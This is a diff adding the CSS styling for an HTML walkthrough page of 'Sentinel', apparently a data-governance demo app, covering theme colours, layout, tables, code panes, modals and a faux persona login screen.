@@ -1,0 +1,1803 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Sentinel — Governed Run Walkthrough</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M12 2 4 5v6c0 5 3.4 8.5 8 11 4.6-2.5 8-6 8-11V5z' fill='%231e50a0'/%3E%3Cpath d='M8 12l3 3 5-6' fill='none' stroke='white' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E" />
+<style>
+  :root {
+    --canvas:#e9edf4; --surface:#ffffff; --surface-2:#f4f7fb;
+    --border:#dde4ee; --border-strong:#c4d0e2;
+    --ink:#0f1b2d; --muted:#57647a; --faint:#66717f;
+    --accent:#1e50a0; --accent-strong:#17417f; --accent-ink:#ffffff;
+    --accent-soft:#e8eef9; --accent-soft-border:#cddbf1;
+    --rail:#0d1a30; --rail-2:#12233f; --rail-ink:#eef3fc; --rail-muted:#93a4c2; --rail-border:#243a5e;
+    --ok:#1b7f3b; --ok-soft:#e6f5ec; --ok-border:#bfe3cc; --ok-ink:#12692f;
+    --warn:#b26a00; --warn-soft:#fbf0dc; --warn-border:#f0d9ad; --warn-ink:#8a5200;
+    --danger:#b3261e; --danger-soft:#fdeceb; --danger-border:#f3ccc9; --danger-ink:#8f1d17;
+    --sans:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+    --mono:"SF Mono","JetBrains Mono","Fira Code","Cascadia Code",ui-monospace,Menlo,Consolas,monospace;
+    --shadow-sm:0 1px 2px rgba(15,27,45,.06);
+    --shadow-md:0 8px 26px -12px rgba(15,27,45,.22);
+    --shadow-lg:0 24px 60px -24px rgba(9,17,32,.42);
+    --r-sm:7px; --r-md:11px; --r-lg:16px;
+    --stage-max:1060px;
+    /* app chrome (topbar / sidebar / rail): theme-aware, unlike the always-dark --rail */
+    --chrome-bg:#ffffff; --chrome-bg-2:#eef2f8; --chrome-ink:#0f1b2d; --chrome-muted:#5b6a82; --chrome-border:#d6deea; --chrome-hover:#e3e9f3; --chrome-abg:#e8eef9; --chrome-aink:#1e50a0; --chrome-aborder:#cddbf1;
+    --code-bg:#f4f7fc; --code-ink:#2a3852; --code-cm:#8a94a6; --code-kw:#1e50a0; --code-str:#1b7f3b; --code-fn:#a35a00; --code-ln:#aab4c6; --code-viol-bg:rgba(179,38,30,.08); --code-viol-ln:#b3261e; --code-border:#d6deea;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --canvas:#0a1220; --surface:#0f1a2c; --surface-2:#14223a;
+      --border:#22334f; --border-strong:#30456a;
+      --ink:#e7edf8; --muted:#9aa8c0; --faint:#8291ab;
+      --accent:#5b8def; --accent-strong:#7aa6f5; --accent-ink:#08121f;
+      --accent-soft:#152743; --accent-soft-border:#2a4576;
+      --rail:#070e1a; --rail-2:#0c1728; --rail-ink:#eef3fc; --rail-muted:#8194b4; --rail-border:#1b2b47;
+      --chrome-bg:#070e1a; --chrome-bg-2:#0c1728; --chrome-ink:#eef3fc; --chrome-muted:#8194b4; --chrome-border:#1b2b47; --chrome-hover:rgba(255,255,255,.06); --chrome-abg:rgba(91,141,239,.16); --chrome-aink:#cfe0fb; --chrome-aborder:#2f4d7e;
+      --code-bg:#0c1626; --code-ink:#c7d3e6; --code-cm:#6b7d9c; --code-kw:#7aa6f5; --code-str:#8fd6a0; --code-fn:#e2c07a; --code-ln:#4d5f7d; --code-viol-bg:rgba(229,103,94,.14); --code-viol-ln:#e5675e; --code-border:#1b2b47;
+      --ok:#4ec27a; --ok-soft:#122a1c; --ok-border:#1f4a30; --ok-ink:#8fe0a9;
+      --warn:#e2a03a; --warn-soft:#2a2110; --warn-border:#4d3a17; --warn-ink:#f0c274;
+      --danger:#e5675e; --danger-soft:#2a1513; --danger-border:#552420; --danger-ink:#f2a39c;
+      --shadow-sm:0 1px 2px rgba(0,0,0,.4);
+      --shadow-md:0 8px 26px -12px rgba(0,0,0,.6);
+      --shadow-lg:0 24px 60px -24px rgba(0,0,0,.75);
+    }
+  }
+  :root[data-theme="light"] {
+    --canvas:#e9edf4; --surface:#ffffff; --surface-2:#f4f7fb;
+    --border:#dde4ee; --border-strong:#c4d0e2;
+    --ink:#0f1b2d; --muted:#57647a; --faint:#66717f;
+    --accent:#1e50a0; --accent-strong:#17417f; --accent-ink:#ffffff;
+    --accent-soft:#e8eef9; --accent-soft-border:#cddbf1;
+    --ok:#1b7f3b; --ok-soft:#e6f5ec; --ok-border:#bfe3cc; --ok-ink:#12692f;
+    --warn:#b26a00; --warn-soft:#fbf0dc; --warn-border:#f0d9ad; --warn-ink:#8a5200;
+    --danger:#b3261e; --danger-soft:#fdeceb; --danger-border:#f3ccc9; --danger-ink:#8f1d17;
+    --shadow-sm:0 1px 2px rgba(15,27,45,.06);
+    --shadow-md:0 8px 26px -12px rgba(15,27,45,.22);
+    --chrome-bg:#ffffff; --chrome-bg-2:#eef2f8; --chrome-ink:#0f1b2d; --chrome-muted:#5b6a82; --chrome-border:#d6deea; --chrome-hover:#e3e9f3; --chrome-abg:#e8eef9; --chrome-aink:#1e50a0; --chrome-aborder:#cddbf1;
+    --code-bg:#f4f7fc; --code-ink:#2a3852; --code-cm:#8a94a6; --code-kw:#1e50a0; --code-str:#1b7f3b; --code-fn:#a35a00; --code-ln:#aab4c6; --code-viol-bg:rgba(179,38,30,.08); --code-viol-ln:#b3261e; --code-border:#d6deea;
+  }
+  :root[data-theme="dark"] {
+    --canvas:#0a1220; --surface:#0f1a2c; --surface-2:#14223a;
+    --border:#22334f; --border-strong:#30456a;
+    --ink:#e7edf8; --muted:#9aa8c0; --faint:#8291ab;
+    --accent:#5b8def; --accent-strong:#7aa6f5; --accent-ink:#08121f;
+    --accent-soft:#152743; --accent-soft-border:#2a4576;
+    --ok:#4ec27a; --ok-soft:#122a1c; --ok-border:#1f4a30; --ok-ink:#8fe0a9;
+    --warn:#e2a03a; --warn-soft:#2a2110; --warn-border:#4d3a17; --warn-ink:#f0c274;
+    --danger:#e5675e; --danger-soft:#2a1513; --danger-border:#552420; --danger-ink:#f2a39c;
+    --chrome-bg:#070e1a; --chrome-bg-2:#0c1728; --chrome-ink:#eef3fc; --chrome-muted:#8194b4; --chrome-border:#1b2b47; --chrome-hover:rgba(255,255,255,.06); --chrome-abg:rgba(91,141,239,.16); --chrome-aink:#cfe0fb; --chrome-aborder:#2f4d7e;
+    --code-bg:#0c1626; --code-ink:#c7d3e6; --code-cm:#6b7d9c; --code-kw:#7aa6f5; --code-str:#8fd6a0; --code-fn:#e2c07a; --code-ln:#4d5f7d; --code-viol-bg:rgba(229,103,94,.14); --code-viol-ln:#e5675e; --code-border:#1b2b47;
+  }
+
+  * { box-sizing:border-box; }
+  html { -webkit-text-size-adjust:100%; }
+  body {
+    margin:0; background:var(--canvas); color:var(--ink);
+    font-family:var(--sans); font-size:15px; line-height:1.5;
+    -webkit-font-smoothing:antialiased; text-rendering:optimizeLegibility;
+  }
+  h1,h2,h3,h4 { margin:0; font-weight:650; letter-spacing:-.011em; text-wrap:balance; }
+  p { margin:0; }
+  button { font-family:inherit; cursor:pointer; }
+  :focus-visible { outline:2px solid var(--accent); outline-offset:2px; }
+  .sr-only { position:absolute; width:1px; height:1px; padding:0; margin:-1px; overflow:hidden; clip:rect(0,0,0,0); white-space:nowrap; border:0; }
+  .mono { font-family:var(--mono); font-variant-numeric:tabular-nums; }
+  .eyebrow { font-size:11px; font-weight:700; letter-spacing:.13em; text-transform:uppercase; color:var(--faint); }
+
+  /* ---------- Command frame ---------- */
+  .topbar {
+    background:var(--chrome-bg); color:var(--chrome-ink);
+    display:flex; align-items:center; gap:18px;
+    padding:12px 22px; border-bottom:1px solid var(--chrome-border);
+  }
+  .brand { display:flex; align-items:center; gap:11px; }
+  .brand svg { width:29px; height:29px; display:block; }
+  .brand .wm { font-weight:700; letter-spacing:.22em; font-size:15px; }
+  .brand .sub { color:var(--chrome-muted); font-size:11px; letter-spacing:.05em; border-left:1px solid var(--chrome-border); padding-left:11px; }
+  .topbar .spacer { flex:1; }
+  .ctx { display:flex; align-items:center; gap:8px; flex-wrap:wrap; }
+  .ctx-chip {
+    display:inline-flex; align-items:center; gap:7px;
+    background:var(--chrome-bg-2); border:1px solid var(--chrome-border); color:var(--chrome-ink);
+    padding:5px 10px; border-radius:999px; font-size:12px; white-space:nowrap;
+  }
+  .ctx-chip .k { color:var(--chrome-muted); }
+  .ctx-chip .dot { width:6px; height:6px; border-radius:50%; }
+  button.ctx-chip { cursor:pointer; font-family:inherit; }
+  button.ctx-chip:hover { background:var(--chrome-hover); border-color:var(--chrome-aborder); }
+  .ctx-chip.tier { border-color:var(--chrome-aborder); }
+  .tier-badge { font-weight:700; letter-spacing:.04em; color:var(--accent); }
+  .iconbtn {
+    display:inline-flex; align-items:center; gap:7px; background:transparent;
+    color:var(--chrome-ink); border:1px solid var(--chrome-border); border-radius:8px;
+    padding:6px 11px; font-size:12.5px;
+  }
+  .iconbtn:hover { background:var(--chrome-hover); }
+
+  /* ---------- Stepper rail ---------- */
+  .rail { background:var(--chrome-bg-2); border-bottom:1px solid var(--chrome-border); padding:12px 16px 14px; overflow-x:auto; }
+  .rail-inner { display:flex; align-items:flex-start; gap:0; min-width:max-content; margin:0 auto; max-width:1180px; }
+  .step { position:relative; display:flex; flex-direction:column; align-items:center; gap:7px; padding:0 4px; flex:1 0 auto; min-width:96px; }
+  .step .connector { position:absolute; top:15px; left:calc(-50% + 15px); right:calc(50% + 15px); height:2px; background:var(--chrome-border); }
+  .step.done .connector, .step.active .connector { background:linear-gradient(90deg,#2f6fd0,#2f6fd0); }
+  .step:first-child .connector { display:none; }
+  .node {
+    width:30px; height:30px; border-radius:50%; display:grid; place-items:center;
+    background:var(--chrome-bg); border:2px solid var(--chrome-border); color:var(--chrome-muted);
+    font-size:12.5px; font-weight:700; z-index:1; transition:transform .15s ease;
+    font-family:var(--mono);
+  }
+  .step button { all:unset; cursor:pointer; display:flex; flex-direction:column; align-items:center; gap:7px; }
+  .step button:focus-visible .node { outline:2px solid var(--accent); outline-offset:2px; }
+  .step.done .node { background:var(--ok-soft); border-color:var(--ok-border); color:var(--ok-ink); }
+  .step.active .node { background:var(--accent); border-color:var(--accent); color:#fff; box-shadow:0 0 0 4px rgba(47,111,208,.28); transform:scale(1.06); }
+  .step .lbl { font-size:11.5px; color:var(--chrome-muted); font-weight:600; letter-spacing:.02em; white-space:nowrap; }
+  .step.active .lbl { color:var(--chrome-ink); }
+  .step .tag { font-size:9.5px; letter-spacing:.04em; padding:1px 6px; border-radius:6px; font-weight:700; text-transform:uppercase; }
+  .tag.fired { background:rgba(226,160,58,.16); color:#e7b45f; border:1px solid rgba(226,160,58,.32); }
+  .tag.caught { background:rgba(229,103,94,.16); color:#f0938b; border:1px solid rgba(229,103,94,.3); }
+  .tag.quiet { color:var(--chrome-muted); opacity:.65; }
+  .tag.meta { background:rgba(47,111,208,.16); color:#8fb2ec; border:1px solid rgba(47,111,208,.34); }
+  .step.meta .connector { border-top:2px dashed var(--chrome-border); background:none; height:0; top:16px; }
+  .step.meta.active .connector, .step.meta.done .connector { border-top-color:#2f6fd0; }
+  .step.meta .node { border-style:dashed; }
+  .step:hover .node { border-color:var(--chrome-aborder); }
+  .step:hover .lbl { color:var(--chrome-ink); }
+
+  /* ---------- Stage ---------- */
+  .stage-wrap { max-width:var(--stage-max); margin:0 auto; padding:26px 22px 120px; }
+  .panel { display:none; animation:rise .32s cubic-bezier(.2,.7,.3,1); }
+  .panel.show { display:block; }
+  @keyframes rise { from { opacity:0; transform:translateY(8px);} to { opacity:1; transform:none; } }
+  @media (prefers-reduced-motion: reduce){
+    .panel, .panel.show { animation:none; }
+    .shimmer { animation:none; background:var(--surface-2); }
+    .drawer, .panel, .toggle, .toggle::after, .ctl, .scrim { transition:none !important; }
+    .node { transition:none; }
+    * { scroll-behavior:auto; }
+  }
+
+  .phead { margin-bottom:18px; }
+  .phead .eyebrow { display:flex; align-items:center; gap:9px; }
+  .phead h2 { font-size:27px; margin:8px 0 6px; }
+  .phead .lede { color:var(--muted); font-size:15px; max-width:64ch; }
+
+  .iodid { display:grid; grid-template-columns:repeat(3,1fr); gap:10px; margin:18px 0 20px; }
+  .iocard { background:var(--surface-2); border:1px solid var(--border); border-radius:var(--r-md); padding:12px 14px; }
+  .iocard .k { font-size:10.5px; font-weight:700; letter-spacing:.11em; text-transform:uppercase; color:var(--faint); margin-bottom:5px; }
+  .iocard .v { font-size:13px; color:var(--ink); }
+  .iocard.does { background:var(--accent-soft); border-color:var(--accent-soft-border); }
+
+  .card { background:var(--surface); border:1px solid var(--border); border-radius:var(--r-lg); box-shadow:var(--shadow-sm); }
+  .card + .card { margin-top:16px; }
+  .card-h { display:flex; align-items:center; gap:10px; padding:15px 18px; border-bottom:1px solid var(--border); }
+  .card-h h3 { font-size:15.5px; }
+  .card-h .eyebrow { margin-left:auto; }
+  .card-b { padding:16px 18px; }
+  .card-b.tight { padding:6px; }
+
+  .section-label { font-size:12px; font-weight:700; color:var(--muted); letter-spacing:.02em; margin:2px 0 10px; display:flex; align-items:center; gap:8px; }
+  .hr { height:1px; background:var(--border); margin:16px 0; border:0; }
+
+  /* control chips */
+  .ctls { display:flex; flex-wrap:wrap; gap:7px; }
+  .ctl {
+    font-family:var(--mono); font-size:11.5px; font-weight:600;
+    display:inline-flex; align-items:center; gap:6px; padding:4px 9px 4px 8px;
+    border-radius:8px; border:1px solid var(--accent-soft-border); background:var(--accent-soft);
+    color:var(--accent); cursor:pointer; transition:transform .1s ease, box-shadow .1s ease;
+  }
+  .ctl:hover { box-shadow:var(--shadow-sm); transform:translateY(-1px); }
+  .ctl .st { width:7px; height:7px; border-radius:50%; }
+  .ctl.pass { background:var(--ok-soft); border-color:var(--ok-border); color:var(--ok-ink); }
+  .ctl.pass .st { background:var(--ok); }
+  .ctl.fired { background:var(--warn-soft); border-color:var(--warn-border); color:var(--warn-ink); }
+  .ctl.fired .st { background:var(--warn); }
+  .ctl.block { background:var(--danger-soft); border-color:var(--danger-border); color:var(--danger-ink); }
+  .ctl.block .st { background:var(--danger); }
+  .ctl.armed { background:var(--surface-2); border-color:var(--border-strong); color:var(--muted); }
+  .ctl.armed .st { background:var(--faint); }
+  .ctl .i { font-weight:700; opacity:.55; margin-left:1px; }
+
+  /* tables */
+  .tbl-wrap { overflow-x:auto; border:1px solid var(--border); border-radius:var(--r-md); }
+  table { border-collapse:collapse; width:100%; font-size:13px; }
+  thead th { text-align:left; font-size:11px; letter-spacing:.06em; text-transform:uppercase; color:var(--muted); font-weight:700; padding:9px 13px; background:var(--surface-2); border-bottom:1px solid var(--border); white-space:nowrap; }
+  tbody td { padding:9px 13px; border-bottom:1px solid var(--border); }
+  tbody tr:last-child td { border-bottom:0; }
+  td.num, th.num { text-align:right; font-family:var(--mono); font-variant-numeric:tabular-nums; }
+  tr.suppressed td { color:var(--danger-ink); background:var(--danger-soft); text-decoration:line-through; text-decoration-color:var(--danger); }
+  tbody tr.row-sel td { background:var(--accent-soft); }
+  .cell-mask { font-family:var(--mono); color:var(--muted); letter-spacing:1px; }
+  .col-denied { color:var(--danger-ink); text-decoration:line-through; text-decoration-color:var(--danger); }
+  .badge { display:inline-flex; align-items:center; gap:6px; font-size:11px; font-weight:700; padding:3px 8px; border-radius:999px; letter-spacing:.02em; }
+  .badge.ok { background:var(--ok-soft); color:var(--ok-ink); border:1px solid var(--ok-border); }
+  .badge.warn { background:var(--warn-soft); color:var(--warn-ink); border:1px solid var(--warn-border); }
+  .badge.danger { background:var(--danger-soft); color:var(--danger-ink); border:1px solid var(--danger-border); }
+  .badge.info { background:var(--accent-soft); color:var(--accent); border:1px solid var(--accent-soft-border); }
+  .badge.neutral { background:var(--surface-2); color:var(--muted); border:1px solid var(--border-strong); }
+
+  /* dataset / agent cards */
+  .kv { display:grid; grid-template-columns:auto 1fr; gap:6px 16px; font-size:13px; }
+  .kv dt { color:var(--muted); }
+  .kv dd { margin:0; text-align:right; }
+  .grid2 { display:grid; grid-template-columns:1fr 1fr; gap:16px; }
+
+  /* substeps (Ask) */
+  .substeps { display:flex; gap:8px; margin-bottom:18px; flex-wrap:wrap; }
+  .substep { flex:1; min-width:150px; text-align:left; color:var(--ink); background:var(--surface); border:1px solid var(--border); border-radius:var(--r-md); padding:11px 13px; display:flex; gap:11px; align-items:center; }
+  .substep.active { border-color:var(--accent); box-shadow:0 0 0 3px var(--accent-soft); }
+  .substep.done { border-color:var(--ok-border); }
+  .substep .n { width:24px; height:24px; border-radius:50%; display:grid; place-items:center; font-family:var(--mono); font-size:12px; font-weight:700; background:var(--surface-2); color:var(--muted); border:1px solid var(--border-strong); flex:none; }
+  .substep.active .n { background:var(--accent); color:#fff; border-color:var(--accent); }
+  .substep.done .n { background:var(--ok-soft); color:var(--ok-ink); border-color:var(--ok-border); }
+  .substep .t { font-size:12.5px; font-weight:650; }
+  .substep .d { font-size:11px; color:var(--muted); }
+  .subpane { display:none; } .subpane.show { display:block; }
+
+  /* option cards */
+  .opts { display:flex; flex-direction:column; gap:9px; }
+  .opt { display:flex; gap:12px; align-items:flex-start; padding:12px 14px; border:1px solid var(--border); border-radius:var(--r-md); background:var(--surface); }
+  .opt.sel { border-color:var(--accent); box-shadow:0 0 0 3px var(--accent-soft); background:var(--surface); }
+  .opt.disabled { opacity:.72; cursor:not-allowed; background:var(--surface-2); }
+  .opt .radio { width:18px; height:18px; border-radius:50%; border:2px solid var(--border-strong); flex:none; margin-top:2px; display:grid; place-items:center; }
+  .opt.sel .radio { border-color:var(--accent); }
+  .opt.sel .radio::after { content:""; width:9px; height:9px; border-radius:50%; background:var(--accent); }
+  .opt .ot { font-size:13.5px; font-weight:600; }
+  .opt .od { font-size:12px; color:var(--muted); margin-top:2px; }
+
+  /* purpose matrix */
+  .pmatrix { display:flex; flex-wrap:wrap; gap:8px; }
+  .pcell { display:flex; align-items:center; gap:8px; padding:9px 12px; border-radius:var(--r-md); border:1px solid var(--border); background:var(--surface); color:var(--ink); font-size:13px; }
+  .pcell .mk { font-family:var(--mono); font-weight:700; }
+  .pcell.allow { border-color:var(--ok-border); background:var(--ok-soft); color:var(--ok-ink); }
+  .pcell.deny { border-color:var(--danger-border); background:var(--danger-soft); color:var(--danger-ink); }
+  .pcell.deny.showpiece { outline:2px solid var(--danger); outline-offset:1px; }
+  button.pcell { font:inherit; cursor:pointer; text-align:left; }
+  button.pcell:hover { box-shadow:var(--shadow-sm); }
+  .pcell.sel { box-shadow:0 0 0 3px var(--accent-soft); }
+
+  /* code */
+  .code { position:relative; background:var(--code-bg); border:1px solid var(--code-border); border-radius:var(--r-md); overflow:auto; }
+  .code table { font-family:var(--mono); font-size:12.5px; width:100%; }
+  .code td { border:0; padding:2px 0; color:var(--code-ink); white-space:pre; }
+  .code td.ln { width:38px; text-align:right; padding-right:14px; color:var(--code-ln); user-select:none; }
+  .code tr.viol td { background:var(--code-viol-bg); }
+  .code tr.viol td.ln { color:var(--code-viol-ln); }
+  .code .cm { color:var(--code-cm); }
+  .code .kw { color:var(--code-kw); }
+  .code .st { color:var(--code-str); }
+  .code .fn { color:var(--code-fn); }
+  .code .viol-tag { color:var(--code-viol-ln); }
+
+  .note { display:flex; gap:10px; padding:11px 13px; border-radius:var(--r-md); font-size:13px; border:1px solid var(--border); background:var(--surface-2); }
+  .note .ico { flex:none; font-weight:800; width:20px; height:20px; border-radius:50%; display:grid; place-items:center; font-size:12px; }
+  .note.info { border-color:var(--accent-soft-border); background:var(--accent-soft); }
+  .note.info .ico { background:var(--accent); color:#fff; }
+  .note.warn { border-color:var(--warn-border); background:var(--warn-soft); color:var(--warn-ink); }
+  .note.warn .ico { background:var(--warn); color:#fff; }
+  .note.ok { border-color:var(--ok-border); background:var(--ok-soft); color:var(--ok-ink); }
+  .note.ok .ico { background:var(--ok); color:#fff; }
+  .note.danger { border-color:var(--danger-border); background:var(--danger-soft); color:var(--danger-ink); }
+  .note.danger .ico { background:var(--danger); color:#fff; }
+
+  .btn { display:inline-flex; align-items:center; gap:8px; border-radius:var(--r-sm); padding:9px 15px; font-size:13.5px; font-weight:600; border:1px solid var(--border-strong); background:var(--surface); color:var(--ink); }
+  .btn:hover { border-color:var(--accent); }
+  .btn.primary { background:var(--accent); color:var(--accent-ink); border-color:var(--accent); }
+  .btn.primary:hover { background:var(--accent-strong); }
+  .btn:disabled { opacity:.5; cursor:default; }
+  .seg { display:inline-flex; background:var(--surface-2); border:1px solid var(--border); border-radius:8px; padding:3px; gap:3px; margin-bottom:14px; }
+  .seg-btn { border:0; background:transparent; color:var(--muted); font-size:12.5px; font-weight:600; padding:5px 13px; border-radius:6px; cursor:pointer; font-family:inherit; }
+  .seg-btn.active { background:var(--surface); color:var(--ink); box-shadow:var(--shadow-sm); }
+  .caret::after { content:"\25AE"; color:var(--accent); animation:blink 1s step-end infinite; margin-left:1px; }
+  @keyframes blink { 50% { opacity:0; } }
+  @media (prefers-reduced-motion: reduce){ .caret::after { animation:none; } }
+
+  .proxybars { display:flex; flex-direction:column; gap:10px; }
+  .pbar { display:grid; grid-template-columns:200px 1fr auto; gap:12px; align-items:center; font-size:12.5px; }
+  .pbar .track { height:9px; border-radius:6px; background:var(--surface-2); border:1px solid var(--border); overflow:hidden; }
+  .pbar .fill { height:100%; border-radius:6px; }
+  .pbar .fill.hi { background:var(--warn); }
+  .pbar .fill.lo { background:var(--accent); }
+  .pbar .val { font-family:var(--mono); font-weight:700; }
+  .threshold { font-size:11px; color:var(--muted); }
+
+  /* narration reveal */
+  .shimmer { height:14px; border-radius:6px; background:linear-gradient(90deg,var(--surface-2) 25%,var(--border) 37%,var(--surface-2) 63%); background-size:400% 100%; animation:sh 1.3s ease infinite; margin:8px 0; }
+  .shimmer.w1{width:92%} .shimmer.w2{width:80%} .shimmer.w3{width:64%}
+  @keyframes sh { 0%{background-position:100% 0} 100%{background-position:-100% 0} }
+  .narration { font-size:15px; line-height:1.62; }
+  .narration p { margin:0 0 12px; }
+  .narration p:last-child { margin-bottom:0; }
+  .narration .sup-note, .narration p.sup-note { color:var(--muted); font-style:italic; font-size:13.5px; }
+
+  /* footer nav */
+  .navbar { position:fixed; bottom:0; left:238px; right:0; z-index:35; background:color-mix(in srgb,var(--surface) 88%, transparent); backdrop-filter:blur(8px); border-top:1px solid var(--border); }
+  .navbar-in { max-width:var(--stage-max); margin:0 auto; padding:12px 22px; display:flex; align-items:center; gap:14px; }
+  .navbar .cap { flex:1; font-size:12.5px; color:var(--muted); }
+  .navbar .cap b { color:var(--ink); font-weight:650; }
+  .stepcount { font-family:var(--mono); font-size:12px; color:var(--faint); }
+
+  /* drawer */
+  .scrim { position:fixed; inset:0; background:rgba(8,14,26,.5); opacity:0; pointer-events:none; transition:opacity .2s ease; z-index:60; }
+  .scrim.show { opacity:1; pointer-events:auto; }
+  .drawer { position:fixed; top:0; right:0; bottom:0; width:min(440px,92vw); background:var(--surface); border-left:1px solid var(--border); box-shadow:var(--shadow-lg); transform:translateX(100%); visibility:hidden; transition:transform .26s cubic-bezier(.2,.7,.3,1), visibility .26s; z-index:61; display:flex; flex-direction:column; }
+  .drawer.show { transform:none; visibility:visible; }
+  .drawer-h { padding:18px 20px 14px; border-bottom:1px solid var(--border); }
+  .drawer-h .cid { font-family:var(--mono); font-size:13px; font-weight:700; color:var(--accent); }
+  .drawer-h h3 { font-size:18px; margin:7px 0 8px; }
+  .drawer-b { padding:18px 20px; overflow-y:auto; }
+  .drawer-b .block { margin-bottom:18px; }
+  .drawer-b .block .lab { font-size:10.5px; font-weight:700; letter-spacing:.11em; text-transform:uppercase; color:var(--faint); margin-bottom:6px; }
+  .drawer-b .block p { font-size:13.5px; color:var(--ink); line-height:1.55; }
+  .drawer-close { position:absolute; top:14px; right:14px; width:32px; height:32px; border-radius:8px; border:1px solid var(--border); background:var(--surface-2); color:var(--muted); display:grid; place-items:center; font-size:16px; }
+  .drawer-close:hover { color:var(--ink); }
+  .actionpill { display:inline-flex; align-items:center; gap:7px; font-size:12px; font-weight:700; padding:4px 10px; border-radius:999px; }
+
+  /* controls modal */
+  .modal { position:fixed; inset:0; z-index:62; display:none; place-items:center; padding:24px; }
+  .modal.show { display:grid; }
+  .modal-card { background:var(--surface); border:1px solid var(--border); border-radius:var(--r-lg); box-shadow:var(--shadow-lg); width:min(680px,96vw); max-height:86vh; display:flex; flex-direction:column; }
+  .modal-h { padding:18px 22px; border-bottom:1px solid var(--border); display:flex; align-items:center; gap:12px; }
+  .modal-b { padding:8px 22px 22px; overflow-y:auto; }
+  .cgroup { margin-top:16px; }
+  .cgroup .gl { font-size:11px; font-weight:700; letter-spacing:.09em; text-transform:uppercase; color:var(--faint); margin:0 0 8px; }
+  .crow { display:flex; align-items:center; gap:12px; padding:10px 12px; border:1px solid var(--border); border-radius:var(--r-md); margin-bottom:7px; }
+  .crow .cn { font-family:var(--mono); font-size:12px; font-weight:700; min-width:118px; color:var(--ink); }
+  .crow .cd { flex:1; font-size:12.5px; color:var(--muted); }
+  .toggle { width:38px; height:22px; border-radius:999px; background:var(--ok); border:0; position:relative; flex:none; }
+  .toggle::after { content:""; position:absolute; top:2px; left:2px; width:18px; height:18px; border-radius:50%; background:#fff; transition:left .16s ease; }
+  .toggle.off { background:var(--border-strong); }
+  .toggle.off::after { left:18px; }
+  .toggle:disabled { opacity:.45; cursor:not-allowed; }
+  .adminnote { font-size:11.5px; color:var(--muted); margin-top:4px; }
+
+  .legend { display:flex; gap:16px; flex-wrap:wrap; font-size:11.5px; color:var(--muted); margin-top:10px; }
+  .legend span { display:inline-flex; align-items:center; gap:6px; }
+  .legend .st { width:8px; height:8px; border-radius:50%; }
+
+  /* buy-the-maths engine bar */
+  .enginebar { display:flex; flex-wrap:wrap; align-items:center; gap:7px; margin-bottom:20px; padding:11px 14px; background:var(--surface); border:1px solid var(--border); border-radius:var(--r-md); box-shadow:var(--shadow-sm); }
+  .eb-lab { font-size:9.5px; font-weight:700; letter-spacing:.11em; text-transform:uppercase; color:var(--faint); }
+  .eb-sep { width:1px; align-self:stretch; background:var(--border); margin:0 5px; }
+  .lib { display:inline-flex; align-items:center; gap:6px; font-family:var(--mono); font-size:11.5px; font-weight:600; padding:3px 9px; border-radius:8px; border:1px solid var(--border-strong); background:var(--surface-2); color:var(--ink); cursor:pointer; }
+  .lib:hover { border-color:#2f9c94; }
+  .lib .d { width:6px; height:6px; border-radius:50%; background:#2f9c94; }
+  .lib.none { color:var(--muted); font-family:var(--sans); font-style:italic; cursor:default; border-style:dashed; }
+  .lib.none:hover { border-color:var(--border-strong); }
+
+  /* stack modal columns */
+  .stackcol .sc-h { font-size:12px; font-weight:700; letter-spacing:.02em; margin:0 0 4px; display:flex; align-items:center; gap:8px; }
+  .stackcol .sc-sub { font-size:11.5px; color:var(--muted); margin:0 0 12px; }
+  .stackrow { display:flex; gap:11px; align-items:baseline; padding:9px 0; border-bottom:1px solid var(--border); }
+  .stackrow:last-child { border-bottom:0; }
+  .stackrow .nm { font-family:var(--mono); font-size:12px; font-weight:700; min-width:96px; }
+  .stackrow .ds { flex:1; font-size:12.5px; color:var(--muted); }
+  .stackrow .sg { font-size:10.5px; color:var(--faint); font-family:var(--mono); white-space:nowrap; }
+  .allowbox { display:flex; flex-wrap:wrap; gap:6px; margin-top:8px; }
+  .roadmap { font-size:11.5px; color:var(--muted); margin-top:14px; padding-top:12px; border-top:1px dashed var(--border-strong); }
+
+  /* faux login */
+  .login { position:fixed; inset:0; z-index:100; background:radial-gradient(1100px 560px at 50% -8%, #16274a, var(--rail)); color:var(--rail-ink); display:flex; align-items:center; justify-content:center; padding:34px 22px; overflow-y:auto; }
+  .login.leaving { opacity:0; transition:opacity .28s ease; pointer-events:none; }
+  .login-inner { width:100%; max-width:860px; text-align:center; }
+  .login-brand { display:flex; align-items:center; justify-content:center; gap:11px; margin-bottom:32px; }
+  .login-brand svg { width:30px; height:30px; }
+  .login-brand .wm { font-weight:700; letter-spacing:.24em; font-size:16px; }
+  .login-brand .sub { color:var(--rail-muted); font-size:11px; letter-spacing:.05em; border-left:1px solid var(--rail-border); padding-left:11px; }
+  .login-eyebrow { font-size:11px; font-weight:700; letter-spacing:.16em; text-transform:uppercase; color:#7fa6e6; }
+  .login-h { font-size:28px; margin:8px 0 8px; color:#fff; }
+  .login-sub { color:var(--rail-muted); font-size:14px; max-width:54ch; margin:0 auto 30px; line-height:1.55; }
+  .persona-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:14px; }
+  .pcard { position:relative; text-align:left; background:rgba(255,255,255,.04); border:1px solid var(--rail-border); border-radius:14px; padding:18px 16px; cursor:pointer; color:var(--rail-ink); transition:transform .12s ease, border-color .12s ease, background .12s ease; font-family:inherit; }
+  .pcard:hover { transform:translateY(-3px); border-color:#3f6bb0; background:rgba(255,255,255,.07); }
+  .pcard:focus-visible { outline:2px solid #5b8def; outline-offset:3px; }
+  .pcard .picon { width:46px; height:46px; border-radius:12px; display:grid; place-items:center; background:rgba(91,141,239,.14); border:1px solid var(--rail-border); color:#9dc0f5; margin-bottom:13px; }
+  .pcard .picon svg { width:24px; height:24px; }
+  .pcard .pname { display:block; font-size:15px; font-weight:650; color:#fff; }
+  .pcard .prole { display:block; font-size:11.5px; color:var(--rail-muted); margin-top:2px; }
+  .pcard .pcap { display:block; font-size:12px; color:#b9c8e2; margin-top:10px; line-height:1.45; }
